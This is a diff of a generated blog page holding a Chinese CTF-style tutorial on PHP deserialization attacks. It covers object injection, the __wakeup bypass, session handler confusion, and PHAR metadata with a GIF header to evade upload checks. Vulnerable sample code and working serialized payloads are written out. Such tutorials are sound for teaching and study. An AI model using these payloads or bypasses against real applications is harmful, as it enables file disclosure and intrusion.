@@ -6,15 +6,41 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://cmacckk.github.io">
-  <title>Archives | CMACCKK blog</title>
+  <title>PHP反序列化 | CMACCKK blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="CMACCKK blog">
-<meta property="og:url" content="http://cmacckk.github.io/archives/index.html">
+  <meta name="description" content="最简单的反序列化123456789101112131415&lt;?php	require_once(&#x27;flag.php&#x27;);	highlight_file(__FILE__);	class A&#123;		private $user &#x3D; &#x27;test&#x27;;		function __destruct()&#123;			if ($this-&gt;user &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化">
+<meta property="og:url" content="http://cmacckk.github.io/2021/06/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="CMACCKK blog">
+<meta property="og:description" content="最简单的反序列化123456789101112131415&lt;?php	require_once(&#x27;flag.php&#x27;);	highlight_file(__FILE__);	class A&#123;		private $user &#x3D; &#x27;test&#x27;;		function __destruct()&#123;			if ($this-&gt;user &#x3D;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/image-20210605224100230.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s1.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s2.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s3.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s4.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s5.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s6.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s7.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s8.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s9.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s10.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s11.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s12.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s13.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s14.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s15.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s16.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s17.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s18.png">
+<meta property="og:image" content="http://cmacckk.github.io/phpUnserialize/s19.png">
+<meta property="article:published_time" content="2021-06-05T15:04:03.000Z">
+<meta property="article:modified_time" content="2024-03-12T07:11:00.575Z">
 <meta property="article:author" content="CMACCKK">
+<meta property="article:tag" content="php反序列化">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cmacckk.github.io/phpUnserialize/image-20210605224100230.png">
   
     <link rel="alternative" href="/atom.xml" title="CMACCKK blog" type="application/atom+xml">
   
@@ -136,36 +162,207 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-php反序列化" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
-  	<time datetime="2021-06-05T15:04:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-05</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a>
+    <h1 class="article-title" itemprop="name">
+      PHP反序列化
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/06/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
+  	<time datetime="2021-06-05T15:04:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-05</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="最简单的反序列化"><a href="#最简单的反序列化" class="headerlink" title="最简单的反序列化"></a>最简单的反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">				<span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+<p>当我们反序列化后 <code>user</code>为 <code>admin</code>时输出 <code>$GLOBALS</code>，输出当前 <code>php</code>页面全局变量</p>
+<p>我们构造 <code>payload</code>如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()));</span><br></pre></td></tr></table></figure>
+
+<p>运行获得 <code>url</code>编码 <code>序列化</code>后的值为 <code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00user%22%3Bs%3A5%3A%22admin%22%3B%7D</code></p>
+<p>将其赋值给 <code>data</code>后即可输出 <code>全局变量</code></p>
+<p><img src="/phpUnserialize/image-20210605224100230.png" alt="image-20210605224100230"></p>
+<h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h2><p>在反反序列化时，如果 <code>表示对象属性个数的值</code>大于 <code>真实的属性个数时</code>就会跳过 <code>__wakeup( )</code>的执行。</p>
+<p>影响版本</p>
+<p><code>php5.0.0 ~ php5.6.25</code></p>
+<p><code>php7.0.0 ~ php7.0.10</code></p>
+<p><code>php</code>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;filename = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>php</code>语言的特性为在反序列化时，先执行 <code>__wakeup()</code>魔术方法，才会执行 <code>__destruct()</code>魔术方法</p>
+<p>也就是说当我们使用 <code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()));</span><br></pre></td></tr></table></figure>
+
+<p><code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
+<p>去反序列化时</p>
+<p>结果为</p>
+<p><img src="/phpUnserialize/s1.png" alt="php_unseriablize1"></p>
+<p>可以发现我们在反序列化时修改的 <code>$filename</code>的值在 <code>__wakeup()</code>函数时由 <code>flag.php</code>修改为了 <code>test.txt</code></p>
+<p>绕过 <code>__wakeup()</code>函数时将 <code>对象属性个数的值</code>大于 <code>真实的属性个数时</code>即可绕过</p>
+<p>即 <code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
+<p>改为，只需要将对象个数大于 <code>1</code>即可，<code>2</code>，<code>3</code>，<code>4</code>等等都行，这里我使用 <code>2</code></p>
+<p><code>O%3A1%3A%22A%22%3A2%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
+<p>即可获取想要的文件的内容</p>
+<p><img src="/phpUnserialize/s2.png" alt="php_unseriablize2"></p>
+<h2 id="private-protect变量构造"><a href="#private-protect变量构造" class="headerlink" title="private protect变量构造"></a>private protect变量构造</h2><p>如最开始</p>
+<p>在构造 <code>payload</code>时</p>
+<p>将所得的 <code>payload</code>进行 <code>url编码</code>即可</p>
+<h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><p><code>PHP</code>中的 <code>Session</code>经序列化后存储，读取时再进行反序列化。</p>
+<p>相关配置：</p>
+<p><code>session.save_path=&quot;&quot;</code> &#x2F;&#x2F;设置session的存储路径</p>
+<p><code>session.save_handler=&quot;&quot;</code> &#x2F;&#x2F;设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</p>
+<p><code>session.auto_start boolen</code> &#x2F;&#x2F;指定会话模块是否在请求开始时启动一个会话 <code>默认为0不启动</code></p>
+<p><code>session.serialize_handler string</code> &#x2F;&#x2F;定义用来序列化&#x2F;反序列化的处理器名字。默认使用 <code>php</code></p>
+<p><code>PHP</code>有 <code>3</code>种序列化处理器</p>
+<table>
+<thead>
+<tr>
+<th align="center">处理器</th>
+<th align="center">对应的存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">php</td>
+<td align="center">键名+竖线（|）+经过serialize()函数处理过的值</td>
+</tr>
+<tr>
+<td align="center">php_binary</td>
+<td align="center">键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</td>
+</tr>
+<tr>
+<td align="center">php_serialize</td>
+<td align="center">经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</td>
+</tr>
+</tbody></table>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>] = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">session_id</span>();</span><br></pre></td></tr></table></figure>
+
+<p>执行后可以看到</p>
+<p><img src="/phpUnserialize/s3.png" alt="php_unseriablize3"></p>
+<p>命名方式为 <code>sess_session_id()</code></p>
+<p>存储内容为序列化后的 <code>session</code>:<code>test|s:4:&quot;test&quot;;</code></p>
+<p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的 <code>session</code>序列化格式不同，就可能产生反序列化漏洞</p>
+<p>因为 <code>index.php</code>与 <code>session.php</code>采用的序列化处理器不同，我们可以构造“误导”处理器，达到漏洞利用的目的</p>
+<p>也就是说将数据通过 <code>session.php</code>序列化后将数据存入的文件与 <code>index.php</code>反序列化获取反序列化值的文件相同</p>
+<p>从而达到反序列化攻击的目的</p>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br/&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>generate.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> A);</span><br></pre></td></tr></table></figure>
+
+<p><code>session.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>] = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">session_id</span>();</span><br></pre></td></tr></table></figure>
+
+<p>首先通过 <code>generate.php</code>构造 <code>payload</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将 <code>O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code>前面加一个 <code>|</code></p>
+<p>即可将反序列化的值存入到 <code>session</code>中使 <code>index.php</code>反序列化</p>
+<p><img src="/phpUnserialize/s4.png" alt="php_unseriablize4"></p>
+<p>即可完成 <code>session反序列化</code>攻击</p>
+<p><img src="/phpUnserialize/s5.png" alt="php_unseriablize5"></p>
+<h2 id="PHAR利用"><a href="#PHAR利用" class="headerlink" title="PHAR利用"></a>PHAR利用</h2><h3 id="1、PHAR简介"><a href="#1、PHAR简介" class="headerlink" title="1、PHAR简介"></a>1、PHAR简介</h3><p>PHAR (“PHp ARchive”)是PHP里类似于JAR的一种打包文件，在PHP5.3或更高版本默认开启，这个特性使得PHP也可以像Java一样方便地实现应用程序打包和组件化，一个应用程序可以打成一个PHAR包，直接方法PHP-FPM中运行</p>
+<h3 id="2、PHAR文件结构"><a href="#2、PHAR文件结构" class="headerlink" title="2、PHAR文件结构"></a>2、PHAR文件结构</h3><p>PHAR文件由3或4个部分组成</p>
+<p>(1) <code>stub</code>	<code>//phar文件头</code></p>
+<p><code>stub</code>就是一个简单的 <code>php</code>文件，最简文件头为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">__HALF_COMPILER</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件头中必须包含 <code>__HALF_COMPILER()</code>除此之外没有限制。（PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测）</p>
+<p>(2)<code>manifest describing the contents</code>  &#x2F;&#x2F;PHAR文件描述该部分存储文件名、文件大小等信息，如下图所示</p>
+<p><img src="/phpUnserialize/s6.png" alt="php_unseriablize6"></p>
+<p>图中标出的地方，存储了经 <code>serialize()</code>的 <code>Meta-data</code>，有序列化过程必有反序列化过程，这就是我们的注入点</p>
+<p>(3) <code>the file contents</code></p>
+<p>PHAR文件内容</p>
+<p>(4) [optional] <code>a signature for verifying Phar integrity (phar file format only)</code> &#x2F;&#x2F; 可选的签名部分， 支持MD5和SHA1</p>
+<p><img src="/phpUnserialize/s7.png" alt="php_unseriablize7"></p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p><code>2018</code>年 <code>Black Hat</code>研究院Sam Thomas的议题：</p>
+<p>It’s a PHP unserialization vulnerability Jim, but not as we know it提供了一种新的php反序列化攻击姿势。PHAR文件的Meta-data可以是任何能够序列化的PHP对象，当PHAR文件被任何文件系统函数首次通过phar:&#x2F;&#x2F;协议解析时Meta-data部分会被反序列化，这个反序列化过程就是我们的攻击点，<code>Meta-data</code>部分填充 <code>payload</code>。</p>
+<p>漏洞利用条件：</p>
+<p>在目标系统上投放一个装在payload的可访问的PHAR文件，通过文件系统函数利用phar:&#x2F;&#x2F;伪协议解析目标PHAR文件。</p>
+<p>注意：要将 <code>php.ini</code>中的 <code>phar.readonly</code>选项设置为 <code>off</code>，否则无法生成 <code>phar</code>文件</p>
+<p><code>testPhar.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);	<span class="comment">//后缀名必须为phar</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);	<span class="comment">//设置stub</span></span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">	<span class="variable">$o</span>-&gt;data = <span class="string">&#x27;cmacckk&#x27;</span>;</span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);		<span class="comment">// 将自定义的meta-data存入manifest</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);	<span class="comment">// 添加要压缩的文件</span></span><br><span class="line">	<span class="comment">// 签名自动计算</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以从箭头中看到序列化后结果</p>
+<p><img src="/phpUnserialize/s8.png" alt="php_unseriablize8"></p>
+<p>箭头标出 <code>Meta-data</code>部分，可以看到为序列化后结果</p>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;destruct called&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;phar://phar.phar/test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/phpUnserialize/s9.png" alt="php_unseriablize9"></p>
+<p>可以看到输出了之前打包的 <code>phar</code>文件中,<code>test.txt</code>文件的内容 <code>test</code>，并成功实例化 <code>A</code>对象，调用了析构函数 <code>(__destruct)</code></p>
+<p>由于 <code>PHP</code>仅通过 <code>stub</code>部分判断文件是否为 <code>PHAR</code>文件，我们可以通过添加文件头、修改后缀的方式绕过上传检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);	<span class="comment">//后缀名必须为phar</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);	<span class="comment">//设置stub，增加gif文件头绕过</span></span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);		<span class="comment">// 将自定义的meta-data存入manifest</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);	<span class="comment">// 添加要压缩的文件</span></span><br><span class="line">	<span class="comment">// 签名自动计算</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP反序列化字符串逃逸-变长"><a href="#PHP反序列化字符串逃逸-变长" class="headerlink" title="PHP反序列化字符串逃逸(变长)"></a>PHP反序列化字符串逃逸(变长)</h2><p>示例代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$pass</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())));</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$c</span>-&gt;pass === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;no no no&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
